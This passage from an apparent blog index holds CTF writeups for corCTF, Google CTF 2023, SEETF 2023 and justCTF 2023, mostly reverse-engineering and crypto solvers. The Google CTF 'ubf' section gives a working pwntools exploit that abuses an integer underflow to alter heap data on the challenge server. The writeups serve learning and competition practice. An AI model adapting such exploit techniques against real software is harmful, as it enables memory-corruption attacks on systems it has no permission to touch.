buf[i+len_div2] = (even_array[i]+0x10001 - v13) % 0x10001 v30 = v30 * mod % 0x10001def decrypt_ntt(key, buf): if len(buf) == 1: return even_array_enc = [0] * (len(buf)//2) odd_array_enc = [0] * (len(buf)//2) mod = pow(key,1&amp;lt;&amp;lt;(16 - int(math.log2(len(buf)))),0x10001) len_div2 = len(buf)&amp;gt;&amp;gt;1 for i in range(len_div2 - 1, -1, -1): v30 = pow(mod, i, 0x10001) v13 = (buf[i] - buf[i + len_div2]) * inverse(2, 0x10001) % 0x10001 even_array_enc[i] = (buf[i] + buf[i + len_div2]) * inverse(2, 0x10001) % 0x10001 odd_array_enc[i] = v13 * inverse(v30, 0x10001) % 0x10001 decrypt_ntt(key, even_array_enc) decrypt_ntt(key, odd_array_enc) for i in range(len(buf)//2): buf[i*2] = int(even_array_enc[i]) buf[i*2+1] = int(odd_array_enc[i])def decrypt(inp,key1,key2): len_log2 = int(math.log2(len(inp)))+1 inp = [pow(pow(1&amp;lt;&amp;lt;len_log2&amp;gt;&amp;gt;1,0xffff,0x10001),-1,0x10001)*inp[i] % 0x10001 for i in range(len(inp))] decrypt_ntt(key2,inp) inp =[(inp[i]-key2) * inverse(key1, 0x10001) % 0x10001 for i in range(len(inp))] decrypt_ntt(key1,inp) return inpdef encrypt(inp,key1,key2): encrypt_ntt(key1,inp) inp = [(inp[i]*key1 + key2) for i in range(len(inp))] encrypt_ntt(key2,inp) inp = [inp[i] * pow(1&amp;lt;&amp;lt;len_log2&amp;gt;&amp;gt;1,0xffff,0x10001) % 0x10001 for i in range(len(inp))] return inprewrote with python. my teammate @poro helped to write decrypt function../encrypt flag.txt key1 key2 &amp;gt; flag.encthe flag was encrypted like above.and i had no idea how to get key1,key2the range of key each key is 1 ~ 0x10001.So I just bruteforced the key.I rewrote it in c using multithreading and compiled it with the -O3 option.decrypt.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;math.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;pthread.h&amp;gt;#define THREAD_COUNT 6long long mod_pow(long long base, long long exp, long long mod) { long long result = 1; while (exp &amp;gt; 0) { if (exp % 2 == 1) { result = (result * base) % mod; } base = (base * base) % mod; exp /= 2; } return result;}long long inverse(long long num, long long mod) { if (num == 0) { return 0; } return mod_pow(num, mod - 2, mod);}void decrypt_ntt(long long key, long long *buf, long long len) { if (len == 1) { return; } long long *even_array_enc = (long long *)malloc(len / 2 * sizeof(long long)); long long *odd_array_enc = (long long *)malloc(len / 2 * sizeof(long long)); long long mod = mod_pow(key, 1 &amp;lt;&amp;lt; (16 - (long long)log2(len)), 0x10001); long long len_div2 = len &amp;gt;&amp;gt; 1; for (int i = len_div2 - 1; i &amp;gt;= 0; i--) { long long v30 = mod_pow(mod, i, 0x10001); long long v13 = ((buf[i] - buf[i + len_div2])) * inverse(2, 0x10001) % 0x10001; if (v13 &amp;lt; 0) { v13 += 0x10001; } even_array_enc[i] = ((buf[i] + buf[i + len_div2])) * inverse(2, 0x10001) % 0x10001; if (even_array_enc[i] &amp;lt; 0) { even_array_enc[i] += 0x10001; } odd_array_enc[i] = v13 * inverse(v30, 0x10001) % 0x10001; if (odd_array_enc[i] &amp;lt; 0) { odd_array_enc[i] += 0x10001; } } decrypt_ntt(key, even_array_enc, len / 2); decrypt_ntt(key, odd_array_enc, len / 2); for (long long i = 0; i &amp;lt; len_div2; i++) { buf[i * 2] = even_array_enc[i]; buf[i * 2 + 1] = odd_array_enc[i]; } free(even_array_enc); free(odd_array_enc);}void decrypt(long long *buf, long long len, long long key1, long long key2) { long long len_log2 = (long long)log2(len); long long len_div = len &amp;gt;&amp;gt; 1; for (int i = 0; i &amp;lt; len_div; i++) { buf[i] = buf[i] * inverse(mod_pow(len_div, 0xffff, 0x10001), 0x10001) % 0x10001; } decrypt_ntt(key2, buf, len_div); for (int i = 0; i &amp;lt; len_div; i++) { buf[i] = (buf[i] - key2) * inverse(key1, 0x10001) % 0x10001; } decrypt_ntt(key1, buf, len_div);}struct ThreadArgs { int *cnt; long long key1_start; long long key1_end; long long *buf;};void* threadDecrypt(void* args) { struct ThreadArgs* threadArgs = (struct ThreadArgs*)args; long long key2 = 0; long long buf[512] = {0}; long long buf2[512] = {0}; unsigned char out[512] = {0}; for (int i = 0; i &amp;lt; 256; i++) { buf[i] = threadArgs-&amp;gt;buf[i]; } for (long long key1 = threadArgs-&amp;gt;key1_end; key1 &amp;gt;= threadArgs-&amp;gt;key1_start; key1--) { for (key2 = 0; key2 &amp;lt;= 0x10001; key2++) { memset(buf2, 0, sizeof(buf2)); for (int i = 0; i &amp;lt; 256; i++) { buf2[i] = buf[i]; } decrypt(buf2, 0x40, key1, key2); if (buf2[0] == 25455 &amp;amp;&amp;amp; buf2[1] == 29283 &amp;amp;&amp;amp; buf2[2] == 29798) { int c = 0; for (int i = 0; i &amp;lt; 256; i++) { out[c++] = buf2[i] &amp;gt;&amp;gt; 8; out[c++] = buf2[i] &amp;amp; 0xff; } printf(&quot;%s\\n&quot;, out); printf(&quot;%lld, %lld\\n&quot;, key1, key2); } } (*threadArgs-&amp;gt;cnt)++; if(*threadArgs-&amp;gt;cnt % 0x10 == 0) { printf(&quot;%lld\\n&quot;, key1); } } return NULL;}int cnt = 0;int main(void) { unsigned char reader[512] = {0,}; long long buf[512] = {0,}; int c = 0; // open ./flag.enc FILE *fp = fopen(&quot;./flag.enc&quot;, &quot;r&quot;); // read flag.enc fread(reader, 1, 512, fp); for (int i = 0; i &amp;lt; 256; i += 2) { buf[c++] = reader[i] &amp;lt;&amp;lt; 8 | reader[i + 1]; } // Divide key1 range into THREAD_COUNT parts long long key1_range = 0x10001 / THREAD_COUNT; pthread_t threads[THREAD_COUNT]; struct ThreadArgs threadArgs[THREAD_COUNT]; // Create and run threads for (int i = 0; i &amp;lt; THREAD_COUNT; i++) { threadArgs[i].key1_start = i * key1_range; threadArgs[i].key1_end = (i == THREAD_COUNT - 1) ? 0x10001 : (i + 1) * key1_range - 1; threadArgs[i].cnt = &amp;amp;cnt; threadArgs[i].buf = buf; printf(&quot;%lld, %lld\\n&quot;, threadArgs[i].key1_start, threadArgs[i].key1_end); pthread_create(&amp;amp;threads[i], NULL, threadDecrypt, (void*)&amp;amp;threadArgs[i]); } // Wait for all threads to finish for (int i = 0; i &amp;lt; THREAD_COUNT; i++) { pthread_join(threads[i], NULL); } return 0;} corctf{i_l0v3_s0lv1ng_nUmb3r_th30r3tic_tR@n5f0rmS!!!}" }, { "title": "(CTF) Google CTF 2023 writeup (oldschool, ubf)", "url": "/posts/(ctf)-2023-googlectf/", "categories": "CTF", "tags": "writeup", "date": "2023-06-26 15:02:13 +0900", "snippet": "oldschoolAnalyzing the logic, there is a condition that when password is made into a 5x5 matrix and matrix multiplication is performed with a 5x5 matrix made using id after sbox, xor, and shift row, an identity matrix must come out. I had to get a password for each of the given list of ids.import structimport numpyfrom numpy import matrixfrom numpy import linalgimport hashlibu32 = lambda x: struct.unpack(&quot;&amp;lt;I&quot;, x)[0]sbox = [16, 14, 13, 2, 11, 17, 21, 30, 7, 24, 18, 28, 26, 1, 12, 6, 31, 25, 0, 23, 20, 22, 8, 27, 4, 3, 19, 5, 9, 10, 29, 15]sbox_inv = [sbox.index(i) for i in range(32)]xor_table = [25, 2, 8, 15, 10, 26, 13, 30, 4, 5, 16, 7, 14, 0, 6, 31, 29, 11, 17, 3, 28, 19, 9, 20, 27, 21, 1, 12, 24, 22, 23, 18]xor_table = [x ^ 2 for x in xor_table]_25160 = [3, 10, 22, 4, 12, 16, 20, 13, 22, 13, 22, 19, 14, 13, 12, 23, 7, 19, 14, 20, 1, 11, 7, 24, 25, 11, 13, 8, 9, 1, 12, 7, 20, 21, 19, 16, 6, 23, 7, 10, 18, 17, 2, 11, 4, 3, 10, 12, 5, 26, 8, 6, 15, 4, 10, 0, 15, 1, 14, 9, 11, 7, 1, 25, 1, 23, 1, 9, 24, 15, 23, 19, 16, 22, 15, 12, 4, 23, 19, 24, 5, 19, 8, 13, 18, 1, 21, 7, 4, 19, 25, 8, 17, 14, 6, 23]for i in range(32): _25160[3*i] ^= _25160[3*i+1] _25160[3*i+1] ^= _25160[3*i] _25160[3*i] ^= _25160[3*i+1]lookup = &quot;23456789ABCDEFGHJKLMNPQRSTUVWXYZ&quot;def modMatInv(A,p): # Finds the inverse of matrix A mod p n=len(A) A=matrix(A) adj=numpy.zeros(shape=(5,5)) for i in range(0,n): for j in range(0,n): adj[i][j]=((-1)**(i+j)*int(round(linalg.det(minor(A,j,i)))))%p return (modInv(int(round(linalg.det(A))),p)*adj)%pdef modInv(a,p): # Finds the inverse of a mod p, if it exists for i in range(1,p): if (i*a)%p==1: return i raise ValueError(str(a)+&quot; has no inverse mod &quot;+str(p))def minor(A,i,j): # Return matrix A with the ith row and jth column deleted A=numpy.array(A) minor=numpy.zeros(shape=(len(A)-1,len(A)-1)) p=0 for s in range(0,len(minor)): if p==i: p=p+1 q=0 for t in range(0,len(minor)): if q==j: q=q+1 minor[s][t]=A[p][q] q=q+1 p=p+1 return minordef shift_rows(mat): v26 = [0]*5 for k in range(1, 5): for m in range(k): v26[m] = mat[5*k+m] for m in range(k, 5): mat[5*k+m-k] = mat[5*k+m] for m in range(5-k, 5): mat[5*k+m] = v26[k-5+m] return matdef inv_shift_rows(mat): v26 = [0]*5 for k in range(1, 5): for m in range(5-k): v26[m] = mat[5*k+m] for m in range(5-k, 5): mat[5*k+m-5+k] = mat[5*k+m] for m in range(k,5): mat[5*k+m] = v26[m-k] return matdef sub(mat): for i in range(5): for j in range(5): mat[5*i+j] = sbox[mat[5*i+j]] return matdef inv_sub(mat): for i in range(5): for j in range(5): mat[5*i+j] = sbox_inv[mat[5*i+j]] return matdef xor(mat): for i in range(5): for j in range(5): mat[5*i+j] = mat[5*i+j] ^ xor_table[5*i+j] return matdef getpassword(A): inv = modMatInv(A,0x20) inv = inv.astype(int).flatten().tolist() inv = inv_shift_rows(inv) inv = xor(inv) inv = inv_sub(inv) password = &quot;&quot; for pw in inv: password += lookup[pw] return &#39;-&#39;.join(password[i:i+5] for i in range(0,len(password),5))def getmatrix(a1): v38 = 0 v37 = 0x7A69 v18 = [0]*80 v36 = 0 v35 = 0 for k in range(0, len(a1), 4): v34 = 0 for m in range(0, 4, 1): v7 = k + m if (v7 == len(a1)): break v34 = (v34 &amp;lt;&amp;lt; 7) | a1[k + m] &amp;amp; 0x7F for i in range(0, 3, 1): v23 = _25160[3 * (v37 % 32) + i] v38 = (2 * v38) | ((v34 &amp;amp; (1 &amp;lt;&amp;lt; v23)) &amp;gt;&amp;gt; v23) for i in range(0, 3, 1): v24 = _25160[3 * (v37 % 32) + i] v34 = (v34 &amp;gt;&amp;gt; (v24 + 1) &amp;lt;&amp;lt; v24) | v34 &amp;amp; ((1 &amp;lt;&amp;lt; v24) - 1) v35 += 3 for i in range(0, (v38 &amp;amp; 7) + 1, 1): v8 = 8121 * v37 + 28411 v37 = v8 % 134456 i = 0 while (i &amp;lt;= 4): v18[16 * v36 + i] = (~v34) &amp;amp; 0x1F i += 1 v34 &amp;gt;&amp;gt;= 5 v36 += 1 for k in range(0, v36, 1): v32 = v18[k] | (32 * v18[k + 16]) | (v18[k + 32] &amp;lt;&amp;lt; 10) &amp;amp; 0xC00 v31 = (8 * v18[k + 48]) | (v18[k + 32] &amp;gt;&amp;gt; 2) &amp;amp; 7 | (v18[k + 64] &amp;lt;&amp;lt; 8) for m in range(0, 13, 1): v10 = v32 ^ ((8 * v31) | (v31 &amp;gt;&amp;gt; 12)) &amp;amp; 0x7FFF v11 = ~((2 * v38) | (v38 &amp;gt;&amp;gt; (v35 - 1))) v25 = v10 ^ v11 &amp;amp; ((1 &amp;lt;&amp;lt; v35) - 1) v32 = v31 &amp;amp; 0x7FFF v31 = (v10 ^ (v11 &amp;amp; ((1 &amp;lt;&amp;lt; v35) - 1))) &amp;amp; 0x7FFF v18[k] = v32 &amp;amp; 0x1F v18[k + 16] = (v32 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F v18[k + 32] = v31 &amp;amp; 0x1C | (v32 &amp;gt;&amp;gt; 10) &amp;amp; 3 v18[k + 48] = (v31 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F v18[k + 64] = (v31 &amp;gt;&amp;gt; 10) &amp;amp; 0x1F v18 = [v18[i:i+5] for i in range(0,len(v18),16)] return v18ids = [&#39;gdwAnDgwbRVnrJvEqzvs&#39;,&#39;ZQdsfjHNgCpHYnOVcGvr&#39;,&#39;PmJgHBtIpaWNEMKiDQYW&#39;,&#39;OAmhVkxiUjUQWcmCCrVj&#39;,&#39;ALdgOAnaBbMwhbXExKrN&#39;,&#39;tqBXanGeFuaRSMDmwrAo&#39;,&#39;etTQMfSiRlMbNSuEOFZo&#39;,&#39;wceLFjLkBstBfQTtwnmv&#39;,&#39;rBiaRSHGLToSvIAQhZIs&#39;,&#39;ackTeRoASCkkkRUIBjmX&#39;,&#39;UBFLQMizCtLCnnOjaLMa&#39;,&#39;UwiBcAZEAJHKmZSrLqTB&#39;,&#39;oYlcWeZwpEEejIGuCHSU&#39;,&#39;txWHHXTtBXbckmRPxgCx&#39;,&#39;mhPdqEbAligcqQCsHLGl&#39;,&#39;UsIdCFPOqrXwsSMoqfIv&#39;,&#39;OdSAfswQJnMyjOlqpmqJ&#39;,&#39;eNKVZRlVwQCxWzDvUrUW&#39;,&#39;dUVNMmEPDxRIdVRXzbKa&#39;,&#39;iMBkfiyJxewhnvxDWXWB&#39;,&#39;xlQgeOrNItMzSrkldUAV&#39;,&#39;UPEfpiDmCeOzpXeqnFSC&#39;,&#39;ispoleetmoreyeah1338&#39;,&#39;dNcnRoRDFvfJbAtLraBd&#39;,&#39;FKBEgCvSeebMGixUVdeI&#39;,&#39;DfBrZwIrsHviSIbenmKy&#39;,&#39;OvQEEDVvxzZGSgNOhaEW&#39;,&#39;iNduNnptWlmAVsszvTIZ&#39;,&#39;GvTcyPNIUuojKfdqCbIQ&#39;,&#39;noAJKHffdaRrCDOpvMyj&#39;,&#39;rAViEUMTbUByuosLYfMv&#39;,&#39;YiECebDqMOwStHZyqyhF&#39;,&#39;phHkOgbzfuvTWVbvRlyt&#39;,&#39;arRzLiMFyEqSAHeemkXJ&#39;,&#39;jvsYsTpHxvXCxdVyCHtM&#39;,&#39;yOOsAYNxQndNLuPlMoDI&#39;,&#39;qHRTGnlinezNZNUCFUld&#39;,&#39;HBBRIZfprBYDWLZOIaAd&#39;,&#39;kXWLSuNpCGxenDxYyalv&#39;,&#39;EkrdIpWkDeVGOSPJNDVr&#39;,&#39;pDXIOdNXHhehzlpbJYGs&#39;,&#39;WMkwVDmkxpoGvuLvgESM&#39;,&#39;aUwdXCDDUWlPQwadOliF&#39;,&#39;WmlngotWTsikaXRDakbp&#39;,&#39;thrZhzSRBzJFPrxKmetr&#39;,&#39;TcurEDzLjepMrNwspPqd&#39;,&#39;SScTJRokTraQbzQpwDTR&#39;,&#39;PObUeTjQTwEflLQtPOJM&#39;,&#39;LUDPGXGvuVFAYlMTTowZ&#39;,&#39;UlTVDrBlCmXmFBmwLLKX&#39;]pairs = []for i,id in enumerate(ids[:]): try: mat = getmatrix(id.encode()) password = getpassword(mat) print(i,id,password) pairs.append((id,password)) except Exception as e: passprint(&#39;CTF{&#39; + hashlib.sha1(b&#39;|&#39;.join(f&#39;{u}:{p}&#39;.encode(&#39;utf-8&#39;) for u, p in pairs)).hexdigest() + &#39;}&#39;)UBFunsigned __int64 __fastcall fix_corrupt_booleans(TYPE *a1){ unsigned __int64 result; // rax unsigned __int64 v2; // [rsp+10h] [rbp-18h] __int64 v3; // [rsp+18h] [rbp-10h] int i; // [rsp+24h] [rbp-4h] v3 = a1-&amp;gt;contents + a1-&amp;gt;start_idx; v2 = a1-&amp;gt;contents + a1-&amp;gt;size; for ( i = 0; ; ++i ) { result = a1-&amp;gt;count; if ( i &amp;gt;= result ) break; result = i + v3; if ( result &amp;gt;= v2 ) break; *(i + v3) = *(i + v3) != 0; } return result;}underflow occurs when converting 2byte start_idx into 8byte. modify flag contents in heap to bypass censor_stringfrom pwn import *from base64 import *#r = process(&quot;./ubf&quot;)r = remote(&quot;ubf.2023.ctfcompetition.com&quot;,1337)payload = p32(0x40) + b&#39;s&#39; + p16(1) + p16(2) + p16(5) + b&quot;$FLAG&quot;payload += p32(0x50) + b&#39;b&#39; + p16(2) + p16(-126&amp;amp;0xffff) + p16(1)payload = b64encode(payload)pause()r.sendline(payload)r.interactive()&quot;&quot;&quot;1.string|4byte total_len | 1byte type s | 2byte count | 2bytes count*2 | 2byte data ..2.bool|4byte size| 1byte type b | 2byte count | 2byte start_idx | boolscount &amp;lt; size; src[count] &amp;lt; endcontents &amp;lt;- countreturn src+countunderflow in start_idx3.int|4byte size| 1byte type i | 2byte count | 2byte smt | ints...count * 4 &amp;lt;= size; src[count] &amp;lt;= endcontents &amp;lt;- count * 4each type = malloc(0x1d), malloc(total_len)resizeraw = malloc(len+it*2+1 * 2), free(total_len)&quot;&quot;&quot;" }, { "title": "(CTF) SEETF CTF 2023 NOW, Murky SEEPass writeup", "url": "/posts/(ctf)-2023-seetf/", "categories": "CTF", "tags": "writeup", "date": "2023-06-12 15:40:13 +0900", "snippet": "Date: June 12, 2023rank: 1team: ProjectSekaiIt’s the first writeup since joining the ProjectSekai. I joined the second day after CCE (local ctf organized by NIS). I took some reversing and smart contracts.NOW ( 11 solve )__int64 __fastcall main(int a1, char **a2, char **a3){ puts(&quot;Obtaining flag...&quot;); flip(dec); recursive(recursive_first, dec); puts(&quot;Here is the...wait, where did it go-&quot;); return 0LL;}It just flip dec (hexadecimal string) and call recursive function.( I changed the names while analyzing )for ( i = 0; ; ++i ){ result = *(i + a1); if ( !result ) break; v3 = to_num(*(i + a1)); *(i + a1) = to_hex((15 - v3));}return result;to_num → 0 to ‘0’, to_hex → ‘0’ to 0the flip function flip all numbers of dec. recursive_first and dec is global variable and looks like this : 780c ... 69 hexademical string.if ( strlen(a2) != 1 || *a2 != &#39;1&#39; ){ if ( is_even(a2) ) // even { div_2(a2); sub_171E(a1, a1); recursive(a1, a2); } else // odd { v2 = to_num(*a2); *a2 = to_hex(v2 - 1); *dest = 0LL; v5 = 0LL; memset(v6, 0, sizeof(v6)); v7 = 0; v8 = 0; strcpy(dest, a1); recursive(a1, a2); sub_171E(a1, dest); }}recursive function, when a2 is 1, the recursive function end. a2 is used like counter, it is divided into two casesif is_even(a2): sub_1932(a2); sub_171E(a1,a1); recursive(a1,a2);else: v2 = to_num(*a2); *a2 = to_hex(v2 - 1); memset(dest, 0, sizeof(dest)); strcpy(dest, a1); recursive(a1, a2); sub_171E(a1, dest);let’s see sub_1932 firstsize_t __fastcall sub_1932(const char *a1){ char carry; // [rsp+17h] [rbp-19h] int i; // [rsp+18h] [rbp-18h] int v4; // [rsp+1Ch] [rbp-14h] carry = 0; for ( i = strlen(a1) - 1; i &amp;gt;= 0; --i ) { v4 = to_num(a1[i]); if ( carry ) { carry = 0; v4 += 0x10; } a1[i] = to_hex(v4 / 2); if ( (v4 &amp;amp; 1) != 0 ) carry = 1; } return replace_0_to_NULL(a1);}it seem’s to implement divide operation on string representations of numbers.unsigned __int64 __fastcall sub_171E(char *a1, char *a2){ int i; // [rsp+14h] [rbp-488Ch] int j; // [rsp+18h] [rbp-4888h] int v5; // [rsp+1Ch] [rbp-4884h] char a1_mul[2176]; // [rsp+20h] [rbp-4880h] BYREF char v7; // [rsp+8A0h] [rbp-4000h] BYREF __int64 v8; // [rsp+38A0h] [rbp-1000h] BYREF char v9[8]; // [rsp+4080h] [rbp-820h] BYREF __int64 v10; // [rsp+4088h] [rbp-818h] char v11[1008]; // [rsp+4090h] [rbp-810h] BYREF int v12; // [rsp+4480h] [rbp-420h] __int16 v13; // [rsp+4484h] [rbp-41Ch] char *src; // [rsp+4490h] [rbp-410h] BYREF __int64 v15; // [rsp+4498h] [rbp-408h] char v16[1008]; // [rsp+44A0h] [rbp-400h] BYREF int v17; // [rsp+4890h] [rbp-10h] __int16 v18; // [rsp+4894h] [rbp-Ch] unsigned __int64 v19; // [rsp+4898h] [rbp-8h] while ( &amp;amp;v8 != &amp;amp;v7 ) ; v19 = __readfsqword(0x28u); *v9 = &#39;0&#39;; v10 = 0LL; memset(v11, 0, sizeof(v11)); v12 = 0; v13 = 0; src = &#39;0&#39;; v15 = 0LL; memset(v16, 0, sizeof(v16)); v17 = 0; v18 = 0; for ( i = 0; i &amp;lt;= 15; ++i ) { strcpy(&amp;amp;a1_mul[1030 * i], &amp;amp;src); // a1*0, a1*1, a1*2 ... a1*15 sub_15BA(&amp;amp;src, a1); } for ( j = 0; a2[j]; ++j ) { v5 = to_num(a2[j]); strcpy(&amp;amp;src, &amp;amp;a1_mul[1030 * v5]); if ( j ) sub_1502(&amp;amp;src, j); sub_15BA(v9, &amp;amp;src); } strcpy(a1, v9); return v19 - __readfsqword(0x28u);}in sub_171E, there are two functions, sub_15BA, sub_1502.sub_15BA → implemented plus operation on string numbers. but subtract if larger than 780c…20a69.sub_1502 → shift left by second argument. If greater than 780c…20a69, subtract that much.so sub_171E works like thisa1_mul -&amp;gt; [ a1*0, a1*1, a1*2, a1*3 ... a1*15 ]v9 += a1_mul[a2[j]]v9 += a1_mul[a2[j+1]] &amp;lt;&amp;lt; 4v9 += a1_mul[a2[j+2]] &amp;lt;&amp;lt; 8...It’s multiply operation on string number. and the result isn’t greater then 780c…20a69. so that function is modular operation.if ( strlen(a2) != 1 || *a2 != &#39;1&#39; ){ if ( is_even(a2) ) // even { a2/=2 a1 = a1 * a1 % M recursive(a1, a2); } else // odd { a2-=1 backup = a1 recursive(a1, a2); a1 = a1 * backup % M }}back to recursive funcion. How to turn a recursive function into a loop?If a2 is even, it updates a1 immediately but if not, it saves a1 and multiply by updated a1. I solved in this way if a2 is odd, store the pair a2 and a1. if not, just update the a1. starting with the smallest a2 stored, update the a1solve codemodulo = &quot;780c9276bf474a488e56d5ec3a4827b8cffeca20cfb3dc5f53b25bc6b4d61152de663e13613222d8b1425a4e3329ac9b302586a0a097e74058466d070fba734ceedde9ef151611e937f249cb4f70e303efc2a96a0b586757a2bb517019aecc9a2cf2bbf6ffc0b496276a2366d2d0131d2829829a100a37e0da3a755aa6ab372430a3c0a666a7a502098a98315684a1c92c53cbafe3d4fbedfc671e1265fbd668c7f399a2371f0c2ad0b16c56ee0478290c34da9cbb8ba6bfc1409c57f5ef1cfaa7517cfe02674479f2f4ec5d1d090f1efa3b04a9d9df178a94c277d8b32a6bf030efe2a7e746c055684bc308c8e5776f0fdf88b52155c149b6810cade8c52f83998f111c773e91e887ce5b2ef1db10ecbc3a5e4aca6a75d426d7334799ebd7cd688fc75de08f7555e791b5e8634a7cdbb1e118ea2e61e287b332f00cf4cafff1b2fa7484aa2eebfb785df0e39dcac7bddb2a085d7bc845c52489202cb48b0e5efcd1ff538df61b6f93578858316fc51be6e5e0eb77fab23b5f94afca48a817f94145c3e66f62a8852e8cbc5de197cf03a7ebf20c6137d9404260b1600e913c946a987d9fd25d98dffc7d0f2b534cee3482789d06191fa10133fda862337cf4e000586f188bcab5d05b8e40726040e7c5aa762b789ed09ff5c0faf39e9e18821cd020f1ca7b16a993219a2172a1af5a78b798ae1522f2f6bfc6657db3b6620a69&quot;a1 = &quot;72feecd39ab2b416966c16b6cfa3b55ce50ffa5d02dbca44d56377be2d8f00e8f8df5548651b1ea37ffe37b9937a0673b1d5756f057625f76c82a6e9daa180baaef543e3bac57c95326e65315831d76b766d354495a2e233d76bfe80b404c0d254ecdc4107704966d1cd959bb26802a7d505250710047497b5dfde45bd9164700d5d3dfa40900fbaa02ae1a047eaac262d1069211fe0b39d86516dde1fe3144120bcbecf6a0c8a50d068cff5b55a1187765bfefc288f5c511ff217c2f435f2ff4524b513d8625aa87239f287423febb8ada47b0f6aaeac71be7355b4e9b12c20de815a052108edc78325b3b3a993ee4612efd17a30626d375f0669adb2632222c5a922cef0a515d848877b2f440f38b3554decd8fda0327995df2a64a426088389495caf89a540a69d2c048d46a29d9d90a560deb1859898398d46a3fe8070d07a34e1da5f8108c2f0a1012e76f422c09a6847cf9b16653c77bca3e3939e14dc01a2757b32ff0ccf0ab62d28c8266c8e1f47e7e25a444e48ffd4f0288e158a9404947786a11e869b6fdc3204b9fc433ba28ac77775ff4b51b1df668154d32e30b01a0ff5968f9bb7b4f5bc772ffc4b1c5af1859dae67552e077f650842c60f4fe1929468f5a701b66bdd9d01c1ce22496c49091f225a26987e3e0f2d7a7f27ab20fd3448450794835477786f6b9a97bf4d4091c9b261d75d62120138b3104f76&quot;a2 = &quot;e7787d3f8c184210c0f99dc6ea823ab6334e2d9ae8acaa00d94eed4ef44e68ad76343fea24e2ccfb4ae358a7101e85ae23a3df24149748677b4f7b062a55ad726539dd51844efda612c38edd194d6c6b5117b569bce7a9cbc4b4bc3f73eab892b1795ca60e485aebe900fcdef242c2344d407e9d06b05e77db8c27c37552bd902a4a520f79f3e1a5e9fd3f182f5e16e117bbdbfe3225a45ce956181cc16f166a58abcbe345543709d1703acc8a27d9eaadcf1d67544ce45ce83985d1c5e45cc3a89f46faa80876f906aa444b7a520a9f1d1eec068c559b35b92f062cbae2e5bcc279c3ff93460ea04649696067854b3dd699e92992a8b883e0f4d291bbe79417d5defe75baa3c9de6cef7279d4cb19d1f40eedf90928165f3d4be915e206cdeb732f1fda3c3fd88ca089719cb3ef38c6040602625e466765c47637185605bece27a0640f42d29e78aa233735402c795b8401b70e72fae7e9bb24696b41844e24f3b197a277cf603aa25127028023de12044efa4b020202e2acdb5612e990556599d4c0f9fc37404dcf5d4ab07dc4ba8b0d0e03420a08db3e0a85faa77d2538ba11f64269e7ae049cc83e45780c0ed9f7c101dcf8dac55b5edc04a00a806f496beee6f33680eab37da22061573f8c933226b1a8e3af754ceba20c42786e78a6a30c19e46f5a7e12ce989a67ab84c79a8f3c571e32af64d031bf3b2c65538b4a19&quot;a1 = int(a1[::-1],16)a2 = int(a2[::-1],16)modulo = int(modulo[::-1],16)a2 = 0x10**1024 - a2 - 1 # flipdef modular_mul(a1,a2): return (a1*a2)%moduloll = {}while a2 != 1: if a2&amp;amp;1==1: ll[a2] = a1 a2-=1 else: a2//=2 a1 = modular_mul(a1,a1)keys = sorted(ll.keys())for k in keys: a1 = modular_mul(a1,ll[k])print(bytes.fromhex(hex(a1)[2:])) SEE{bTw_NOW_1s_riv3st_sH4m1r_Adl3m4n_cAEs4r_sh1Fted_tw3ntY_tWO}Murky SEEPass (14 solve)replaced with picturesXD" }, { "title": "(CTF) just CTF 2023 rustberry, manGO writeup", "url": "/posts/(ctf)-just-ctf-2023/", "categories": "CTF", "tags": "writeup", "date": "2023-06-06 15:15:52 +0900", "snippet": "rustberry if (puVar1 != (undefined4 *)0x0) { puVar1[0x25] = 0x7; puVar1[0x29] = 0x1c; puVar1[0x2a] = 0xff; puVar1[0x18] = 0x3; puVar1[0x26] = 0x21; puVar1[0x19] = 0x1a; puVar1[0x1a] = 0x11; puVar1[0x1b] = 0x14; ... memcpy(__dest, &quot;abcdefghijklmnopqrstuvwxyz_{}0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZGive me the flag? \\nYou\\&#39;ve entered \\nError: \\nIndex out of bounds()/rustc/84c898d65adf2f39a5a98507f1fe0ce10a2b8dbc/library/core/src/str/pattern.rs&quot; ,0x41); } ... do { uVar3 = (uint)*(byte *)(unaff_r11 + uVar7); if (uVar3 == *unaff_r6) { uVar3 = count_leading_zeroes(0x0); iVar5 = 0x0;LAB_0001624c: iVar5 = iVar5 + (uVar3 &amp;gt;&amp;gt; 0x5 ^ 0x1); } else { if (uVar3 == unaff_r6[0x1]) { uVar3 = count_leading_zeroes(0x0); iVar5 = 0x1; goto LAB_0001624c; } if (uVar3 == unaff_r6[0x2]) { uVar3 = count_leading_zeroes(0x0); iVar5 = 0x2; goto LAB_0001624c; } if (uVar3 == unaff_r6[0x3]) { uVar3 = count_leading_zeroes(0x0);arm &amp;amp; rust 바이너리, 기드라로 열면 디컴이 잘 보인다. puVar1 배열의 값을 인덱스로 문자열 가져와서 단순비교.arm &amp;amp; rust binary, if you open it with Ghidra, you can see pseudo code well. Simple comparison by getting the value of puVar1 array as a index of string at __destpuVar1 = [0]*100puVar1[0x25] = 0x7;...puVar1[0x1] = 0x2;puVar1[0x2] = 0x13;s = &quot;&quot;&quot;abcdefghijklmnopqrstuvwxyz_{}0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;&quot;&quot;for i in range(len(puVar1)): print(s[puVar1[i]], end=&quot;&quot;) jctf{n0_vM_just_plain_0ld_ru5tb3rry_ch4ll}manGOAnalysis while watching assembly and decompilation with idaEncryption proceeds in the following order in main.main main.convxor with 0x37, concatenates each string after converting to octal main.gen_tableCreating a table using math/rand main.shuffleshuffle main.mangoifyConverts each shuffled string to binary number, converts 1 -&amp;gt; O, and connects each character with otable 만 알아내면 쉽게 복호화할 수 있지만 테이블값을 모른다. 모든 table 을 생성해보기에는 경우의수가 너무 많다.디버깅해보면, seed 값으로 0x100000 이하의 랜덤한 소수를 사용하는 것을 볼 수 있다.이정도면 빠른 시간안에 찾을 수 있으므로, 복호화했을 때 flag format 인 just 으로 시작하는 문자열을 출력했다It can be easily decrypted if only the table is known, but the table value is unknown. There are too many cases to create all tables.When debugging, you can see that a random prime number less than 0x100000 is used as the seed value.This can be found quickly, so when decrypted, a string starting with just, which is a flag format, was output.f = open(&quot;./output.txt&quot;).read()def unbin(data): data = data.replace(&quot;O&quot;,&quot;1&quot;) data = data.split(&quot;o&quot;) data = list(map(lambda 